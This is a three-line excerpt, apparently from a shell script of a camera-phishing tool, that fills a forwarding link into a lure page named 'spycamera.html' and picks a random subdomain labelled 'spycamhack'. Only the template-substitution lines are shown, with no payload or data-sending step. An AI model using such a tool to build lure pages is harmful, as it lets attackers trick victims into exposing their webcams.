...
sed 's+forwarding_link+'$link'+g' spycamera.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' spycamera.html > index2.html
...
default_subdomain="spycamhack$RANDOM"
